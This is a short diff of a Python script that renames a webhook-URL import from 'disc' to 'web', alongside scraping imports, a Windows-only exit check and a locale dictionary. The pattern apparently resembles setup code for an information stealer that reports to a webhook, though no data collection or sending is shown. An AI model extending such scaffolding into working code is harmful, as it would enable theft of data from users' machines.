@@ -73,7 +73,7 @@ def main_1():
 def main_2():
     from bs4 import BeautifulSoup
     from collections import deque
-    from mainfile import disc, name, non
+    from mainfile import web, name, non
     import requests
     import requests.exceptions
     import urllib.parse
@@ -147,7 +147,6 @@ def main_2():
 
 
     import re, os
-    from mainfile import disc
 
     if os.name != "nt":
         exit()
@@ -163,7 +162,7 @@ def main_2():
     from time import sleep
     from sys import argv
 
-    webhook_url = disc
+    webhook_url = web
 
     languages = {
         'da': 'Danish, Denmark',
